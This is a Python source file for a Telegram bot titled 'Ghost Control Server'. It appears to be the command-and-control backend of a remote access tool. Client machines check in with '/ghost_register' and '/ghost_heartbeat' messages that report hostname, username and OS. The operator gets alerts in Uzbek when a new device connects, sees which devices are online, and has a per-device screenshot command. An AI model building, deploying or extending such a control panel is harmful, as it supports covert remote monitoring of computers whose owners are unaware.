# bot.py - v3.0.6 PRODUCTION SERVER BOT
"""
🚀 Production-Grade Async Server Bot
- ServiceContext architecture (no globals)
- Async database with aiosqlite
- RotatingFileHandler for logs
- Global error handler
- 24/7 stable operation
"""

import asyncio
import logging
import json
import sys
from datetime import datetime
from logging.handlers import RotatingFileHandler
from typing import Optional, Dict, Any

from telethon import TelegramClient, events
from telethon.tl.custom import Button
from telethon.errors import FloodWaitError

from config import (
    API_ID, API_HASH, BOT_TOKEN, ADMIN_ID,
    USE_OPENROUTER, OPENROUTER_API_KEY, OPENROUTER_MODEL, GEMINI_API_KEY,
    CURRENT_VERSION
)
from database import AsyncDatabase
from device_manager import AsyncDeviceRegistry, AsyncHeartbeatManager, format_device_info
from ai_helper import initialize_ai_helper, get_ai_helper, is_ai_enabled, enable_ai, disable_ai


# ==================== LOGGING SETUP ====================
def setup_logging():
    """Configure production logging with rotation"""
    
    # Create formatters
    console_format = logging.Formatter(
        '%(asctime)s - %(levelname)s - %(message)s',
        datefmt='%H:%M:%S'
    )
    file_format = logging.Formatter(
        '%(asctime)s - %(name)s - %(levelname)s - %(funcName)s:%(lineno)d - %(message)s'
    )
    
    # Root logger
    root_logger = logging.getLogger()
    root_logger.setLevel(logging.INFO)
    
    # Clear existing handlers
    root_logger.handlers.clear()
    
    # Console handler
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(logging.INFO)
    console_handler.setFormatter(console_format)
    root_logger.addHandler(console_handler)
    
    # File handler with rotation (5MB max, 5 backups)
    try:
        file_handler = RotatingFileHandler(
            'server.log',
            maxBytes=5 * 1024 * 1024,  # 5MB
            backupCount=5,
            encoding='utf-8'
        )
        file_handler.setLevel(logging.DEBUG)
        file_handler.setFormatter(file_format)
        root_logger.addHandler(file_handler)
    except Exception as e:
        print(f"Warning: Could not create log file: {e}")
    
    return logging.getLogger(__name__)

logger = setup_logging()


# ==================== SERVICE CONTEXT ====================
class ServiceContext:
    """
    Dependency injection container
    Holds all service instances - no globals!
    """
    
    def __init__(self):
        self.db: Optional[AsyncDatabase] = None
        self.registry: Optional[AsyncDeviceRegistry] = None
        self.heartbeat: Optional[AsyncHeartbeatManager] = None
        self.client: Optional[TelegramClient] = None
        
        # State
        self.user_state: Dict[int, str] = {}
        self._initialized = False
    
    async def initialize(self) -> bool:
        """Initialize all services"""
        try:
            # Database
            logger.info("Initializing async database...")
            self.db = AsyncDatabase("server_bot.db")
            if not await self.db.connect():
                logger.error("Database connection failed!")
                return False
            
            # Device Registry
            logger.info("Initializing device registry...")
            self.registry = AsyncDeviceRegistry(self.db)
            await self.registry.load()
            
            # Heartbeat Manager
            logger.info("Initializing heartbeat manager...")
            self.heartbeat = AsyncHeartbeatManager(self.registry, interval=60, timeout=120)
            
            # AI
            logger.info("Initializing AI...")
            self._init_ai()
            
            self._initialized = True
            logger.info("✅ All services initialized")
            return True
            
        except Exception as e:
            logger.error(f"Service initialization error: {e}", exc_info=True)
            return False
    
    def _init_ai(self):
        """Initialize AI provider"""
        try:
            if USE_OPENROUTER and OPENROUTER_API_KEY and OPENROUTER_API_KEY != "YOUR_KEY":
                success = initialize_ai_helper(
                    provider_type="openrouter",
                    api_key=OPENROUTER_API_KEY
                )
                if success:
                    logger.info("✅ OpenRouter AI initialized")
                    enable_ai()
                    return
                else:
                    logger.warning("⚠️ OpenRouter failed, trying Gemini...")
            
            if GEMINI_API_KEY and GEMINI_API_KEY != "YOUR_API_KEY":
                success = initialize_ai_helper(
                    provider_type="gemini",
                    api_key=GEMINI_API_KEY
                )
                if success:
                    logger.info("✅ Gemini AI initialized")
                    enable_ai()
                    return
            
            logger.warning("⚠️ No AI API key configured")
            disable_ai()
            
        except Exception as e:
            logger.error(f"AI init error: {e}")
            disable_ai()
    
    async def shutdown(self):
        """Clean shutdown of all services"""
        logger.info("Shutting down services...")
        
        if self.heartbeat:
            self.heartbeat.stop()
        
        if self.db:
            await self.db.disconnect()
        
        self._initialized = False
        logger.info("Services shutdown complete")
    
    @property
    def is_ready(self) -> bool:
        return self._initialized and self.db and self.db.is_connected


# ==================== GLOBAL ERROR HANDLER ====================
def create_error_handler(ctx: ServiceContext):
    """Create global error handler for Telegram events"""
    
    async def error_handler(event):
        """Handle errors in event handlers"""
        try:
            error_msg = str(event.exception) if hasattr(event, 'exception') else str(event)
            logger.error(f"Telegram event error: {error_msg}", exc_info=True)
            
            # Log to database
            if ctx.db and ctx.db.is_connected:
                await ctx.db.log_error(
                    device_id='SERVER',
                    error_type='telegram_event',
                    error_message=error_msg[:500],
                    stack_trace=None
                )
            
        except Exception as e:
            logger.error(f"Error handler failed: {e}")
    
    return error_handler


# ==================== HANDLERS ====================
def register_handlers(client: TelegramClient, ctx: ServiceContext):
    """Register all event handlers"""
    
    # ==================== DEVICE REGISTRATION ====================
    @client.on(events.NewMessage(pattern=r'^/ghost_register\s+(.+)$'))
    async def device_register_handler(event):
        """Handle device registration from clients"""
        try:
            json_data = event.pattern_match.group(1)
            data = json.loads(json_data)
            
            device_id = data.get('device_id')
            device_info = data.get('info', {})
            client_version = data.get('version', 'unknown')
            
            if not device_id:
                logger.warning("Registration without device_id")
                return
            
            # Check if new device
            existing = ctx.registry.get_device(device_id)
            is_new = existing is None
            
            # Register
            await ctx.registry.register(device_id, device_info)
            logger.info(f"✅ Device registered: {device_id} (v{client_version})")
            
            # Notify admin about new device
            if is_new:
                hostname = device_info.get('hostname', 'Unknown')
                username = device_info.get('username', 'Unknown')
                os_info = device_info.get('os', 'Unknown')
                
                await client.send_message(
                    ADMIN_ID,
                    f"🟢 **Yangi Qurilma Ulandi!**\n\n"
                    f"🆔 ID: `{device_id}`\n"
                    f"💻 Host: `{hostname}`\n"
                    f"👤 User: `{username}`\n"
                    f"🖥️ OS: `{os_info}`\n"
                    f"📦 Version: `v{client_version}`\n"
                    f"🕐 Time: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
                )
            
            # Confirm to client
            await event.respond(f"OK:{device_id}")
            
        except json.JSONDecodeError as e:
            logger.error(f"Invalid JSON in registration: {e}")
        except Exception as e:
            logger.error(f"Device registration error: {e}")
    
    # ==================== HEARTBEAT ====================
    @client.on(events.NewMessage(pattern=r'^/ghost_heartbeat\s+(.+)$'))
    async def device_heartbeat_handler(event):
        """Handle device heartbeat"""
        try:
            json_data = event.pattern_match.group(1)
            data = json.loads(json_data)
            
            device_id = data.get('device_id')
            if not device_id:
                return
            
            success = await ctx.registry.heartbeat(device_id)
            
            if not success:
                # Device needs re-registration
                await event.respond(f"REREGISTER:{device_id}")
                
        except json.JSONDecodeError:
            pass
        except Exception as e:
            logger.error(f"Heartbeat handler error: {e}")
    
    # ==================== ADMIN COMMANDS ====================
    @client.on(events.NewMessage(pattern='/start', chats=ADMIN_ID))
    async def start_handler(event):
        """Start command"""
        try:
            stats = ctx.registry.get_statistics()
            
            message = (
                f"🤖 **Ghost Control Server v{CURRENT_VERSION}**\n\n"
                f"📊 **Status:**\n"
                f"🟢 Online: {stats['online']}\n"
                f"🔴 Offline: {stats['offline']}\n"
                f"📱 Total: {stats['total']}\n"
                f"📈 Uptime: {stats['online_percent']}%\n\n"
                f"🤖 AI: {'✅ Enabled' if is_ai_enabled() else '❌ Disabled'}\n\n"
                f"💬 Type anything to chat with AI"
            )
            
            buttons = [
                [Button.inline("📱 Devices", b"devices"),
                 Button.inline("📊 Statistics", b"stats")],
                [Button.inline("🤖 AI Settings", b"ai_settings"),
                 Button.inline("🔄 Refresh", b"back_to_main")]
            ]
            
            await event.reply(message, buttons=buttons)
            
        except Exception as e:
            logger.error(f"Start handler error: {e}")
            await event.reply(f"❌ Error: {e}")
    
    @client.on(events.NewMessage(pattern='/devices', chats=ADMIN_ID))
    async def devices_command(event):
        """Devices command"""
        try:
            devices = ctx.registry.get_all_devices()
            
            if not devices:
                await event.reply(
                    "📱 **Devices**\n\n❌ Hozircha qurilmalar yo'q.",
                    buttons=[[Button.inline("🔙 Back", b"back_to_main")]]
                )
                return
            
            buttons = []
            for device_id, device in devices.items():
                status_emoji = "🟢" if device['status'] == 'online' else "🔴"
                info = device['info']
                button_text = f"{status_emoji} {info.get('hostname', 'Unknown')} ({info.get('username', 'User')})"
                buttons.append([Button.inline(button_text, f"device_{device_id}".encode())])
            
            buttons.append([Button.inline("🔙 Back", b"back_to_main")])
            
            await event.reply(f"📱 **Devices ({len(devices)})**", buttons=buttons)
            
        except Exception as e:
            logger.error(f"Devices command error: {e}")
    
    @client.on(events.NewMessage(pattern='/stats', chats=ADMIN_ID))
    async def stats_command(event):
        """Stats command"""
        try:
            dashboard = await ctx.db.get_dashboard_stats()
            
            message = (
                f"📊 **Statistics**\n\n"
                f"📱 Total Devices: `{dashboard.get('total_devices', 0)}`\n"
                f"🟢 Online: `{dashboard.get('online_devices', 0)}`\n"
                f"💓 Total Heartbeats: `{dashboard.get('total_heartbeats', 0)}`\n"
                f"⚡ Total Commands: `{dashboard.get('total_commands', 0)}`\n"
                f"❌ Total Errors: `{dashboard.get('total_errors', 0)}`"
            )
            
            await event.reply(message, buttons=[[Button.inline("🔙 Back", b"back_to_main")]])
            
        except Exception as e:
            logger.error(f"Stats command error: {e}")
    
    # ==================== ADMIN MESSAGES (AI Chat) ====================
    @client.on(events.NewMessage(chats=ADMIN_ID))
    async def admin_message_handler(event):
        """Handle admin text messages - AI chat"""
        try:
            # Ignore own messages
            if event.out:
                return
            
            message = event.raw_text.strip()
            
            # Ignore commands
            if message.startswith('/'):
                return
            
            # Check state
            current_state = ctx.user_state.get(ADMIN_ID, "idle")
            if current_state != "idle":
                return
            
            # AI chat
            if is_ai_enabled() and message:
                ai = get_ai_helper()
                if ai:
                    try:
                        response = await ai.generate_response(message)
                        if response:
                            await event.reply(response)
                        else:
                            await event.reply("❌ AI javob bera olmadi.")
                    except Exception as e:
                        logger.error(f"AI response error: {e}")
                        await event.reply(f"❌ AI xatosi: {str(e)}")
                        
        except Exception as e:
            logger.error(f"Message handler error: {e}")
    
    # ==================== CALLBACK HANDLER ====================
    @client.on(events.CallbackQuery())
    async def callback_handler(event):
        """Handle button callbacks"""
        try:
            # Admin only
            if event.sender_id != ADMIN_ID:
                return
            
            data = event.data.decode()
            
            if data == "back_to_main":
                ctx.user_state[ADMIN_ID] = "idle"
                await show_main_menu(event, ctx)
            
            elif data == "devices":
                await show_devices(event, ctx)
            
            elif data == "stats":
                await show_statistics(event, ctx)
            
            elif data == "ai_settings":
                await show_ai_settings(event, ctx)
            
            elif data == "ai_enable":
                enable_ai()
                await event.answer("✅ AI enabled")
                await show_ai_settings(event, ctx)
            
            elif data == "ai_disable":
                disable_ai()
                await event.answer("⚠️ AI disabled")
                await show_ai_settings(event, ctx)
            
            elif data.startswith("device_"):
                device_id = data.replace("device_", "")
                await show_device_details(event, ctx, device_id)
            
            else:
                # Mark state as active for commands
                if data.startswith("cmd_") or data.startswith("ps_"):
                    ctx.user_state[ADMIN_ID] = f"waiting_for_{data}"
                    
        except Exception as e:
            error_msg = str(e).lower()
            if "not modified" not in error_msg:
                logger.error(f"Callback handler error: {e}")
                await event.answer(f"❌ Error", alert=True)
    
    logger.info("All handlers registered")


# ==================== UI FUNCTIONS ====================
async def show_main_menu(event, ctx: ServiceContext):
    """Show main menu"""
    try:
        stats = ctx.registry.get_statistics()
        
        message = (
            f"🤖 **Ghost Control Server v{CURRENT_VERSION}**\n\n"
            f"📊 **Status:**\n"
            f"🟢 Online: {stats['online']}\n"
            f"🔴 Offline: {stats['offline']}\n"
            f"📱 Total: {stats['total']}\n\n"
            f"🤖 AI: {'✅ Enabled' if is_ai_enabled() else '❌ Disabled'}"
        )
        
        buttons = [
            [Button.inline("📱 Devices", b"devices"),
             Button.inline("📊 Statistics", b"stats")],
            [Button.inline("🤖 AI Settings", b"ai_settings"),
             Button.inline("🔄 Refresh", b"back_to_main")]
        ]
        
        await event.edit(message, buttons=buttons)
        
    except Exception as e:
        logger.error(f"Show main menu error: {e}")


async def show_devices(event, ctx: ServiceContext):
    """Show devices list"""
    try:
        devices = ctx.registry.get_all_devices()
        
        if not devices:
            await event.edit(
                "📱 **Devices**\n\n❌ Hozircha qurilmalar yo'q.",
                buttons=[[Button.inline("🔙 Back", b"back_to_main")]]
            )
            return
        
        buttons = []
        for device_id, device in devices.items():
            status_emoji = "🟢" if device['status'] == 'online' else "🔴"
            info = device['info']
            button_text = f"{status_emoji} {info.get('hostname', 'Unknown')}"
            buttons.append([Button.inline(button_text, f"device_{device_id}".encode())])
        
        buttons.append([Button.inline("🔙 Back", b"back_to_main")])
        
        await event.edit(f"📱 **Devices ({len(devices)})**", buttons=buttons)
        
    except Exception as e:
        logger.error(f"Show devices error: {e}")


async def show_device_details(event, ctx: ServiceContext, device_id: str):
    """Show device details"""
    try:
        device = ctx.registry.get_device(device_id)
        
        if not device:
            await event.answer("❌ Device not found")
            return
        
        message = format_device_info(device)
        
        buttons = [
            [Button.inline("📸 Screenshot", f"cmd_screenshot_{device_id}".encode())],
            [Button.inline("🔙 Back", b"devices")]
        ]
        
        await event.edit(message, buttons=buttons)
        
    except Exception as e:
        logger.error(f"Show device details error: {e}")


async def show_statistics(event, ctx: ServiceContext):
    """Show statistics"""
    try:
        dashboard = await ctx.db.get_dashboard_stats()
        
        message = (
            f"📊 **Statistics**\n\n"
            f"📱 Total Devices: `{dashboard.get('total_devices', 0)}`\n"
            f"🟢 Online: `{dashboard.get('online_devices', 0)}`\n"
            f"💓 Total Heartbeats: `{dashboard.get('total_heartbeats', 0)}`\n"
            f"⚡ Total Commands: `{dashboard.get('total_commands', 0)}`\n"
            f"❌ Total Errors: `{dashboard.get('total_errors', 0)}`"
        )
        
        await event.edit(message, buttons=[[Button.inline("🔙 Back", b"back_to_main")]])
        
    except Exception as e:
        logger.error(f"Show statistics error: {e}")


async def show_ai_settings(event, ctx: ServiceContext):
    """Show AI settings"""
    try:
        ai_enabled = is_ai_enabled()
        ai = get_ai_helper()
        ai_type = type(ai.provider).__name__ if ai and hasattr(ai, 'provider') and ai.provider else "None"
        
        if 'OpenRouter' in ai_type:
            ai_model = "OpenRouter"
        elif 'Gemini' in ai_type:
            ai_model = "Gemini"
        else:
            ai_model = "Not initialized"
        
        message = (
            f"🤖 **AI Settings**\n\n"
            f"Status: {'✅ Enabled' if ai_enabled else '❌ Disabled'}\n"
            f"Model: {ai_model}"
        )
        
        buttons = [
            [Button.inline("✅ Enable AI" if not ai_enabled else "❌ Disable AI",
                          b"ai_enable" if not ai_enabled else b"ai_disable")],
            [Button.inline("🔙 Back", b"back_to_main")]
        ]
        
        await event.edit(message, buttons=buttons)
        
    except Exception as e:
        logger.error(f"Show AI settings error: {e}")


# ==================== MAIN ====================
async def main():
    """Main entry point"""
    
    # Create service context
    ctx = ServiceContext()
    
    try:
        logger.info(f"Starting Server Bot v{CURRENT_VERSION}...")
        
        # Initialize services
        if not await ctx.initialize():
            logger.error("Service initialization failed!")
            return
        
        # Create Telegram client
        client = TelegramClient('server_bot', API_ID, API_HASH)
        ctx.client = client
        
        await client.start(bot_token=BOT_TOKEN)
        
        # Register handlers
        register_handlers(client, ctx)
        
        # Setup device offline callback
        async def on_device_offline(device_id):
            try:
                device = ctx.registry.get_device(device_id)
                if device:
                    message = (
                        f"🔴 **Device Offline**\n\n"
                        f"📱 Device: `{device_id}`\n"
                        f"💻 Hostname: `{device['info'].get('hostname', 'Unknown')}`\n"
                        f"👤 User: `{device['info'].get('username', 'Unknown')}`"
                    )
                    await client.send_message(ADMIN_ID, message)
                    
                    # Log to database
                    await ctx.db.log_activity(device_id, "device_offline", "Device went offline", "info")
                    
            except Exception as e:
                logger.error(f"On device offline error: {e}")
        
        ctx.heartbeat.on_device_offline = on_device_offline
        
        # Start heartbeat manager
        ctx.heartbeat.start()
        
        # Notify admin
        ai_status = "✅ AI enabled" if is_ai_enabled() else "⚠️ AI disabled"
        
        await client.send_message(
            ADMIN_ID,
            f"🤖 **Server Bot v{CURRENT_VERSION} Started**\n\n"
            "✅ Async database connected (aiosqlite)\n"
            "✅ Device registry active\n"
            "✅ Heartbeat manager running\n"
            "✅ RotatingFileHandler logging\n"
            f"{ai_status}\n\n"
            "💬 Send /start to open dashboard"
        )
        
        logger.info(f"✅ Server Bot v{CURRENT_VERSION} is running (24/7)")
        
        # Run forever
        await client.run_until_disconnected()
        
    except FloodWaitError as e:
        logger.error(f"Flood wait: sleeping {e.seconds}s")
        await asyncio.sleep(e.seconds)
    except KeyboardInterrupt:
        logger.info("Server Bot stopped by user")
    except Exception as e:
        logger.error(f"Server Bot error: {e}", exc_info=True)
    finally:
        await ctx.shutdown()
        logger.info("Server Bot shutdown complete")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Server Bot stopped")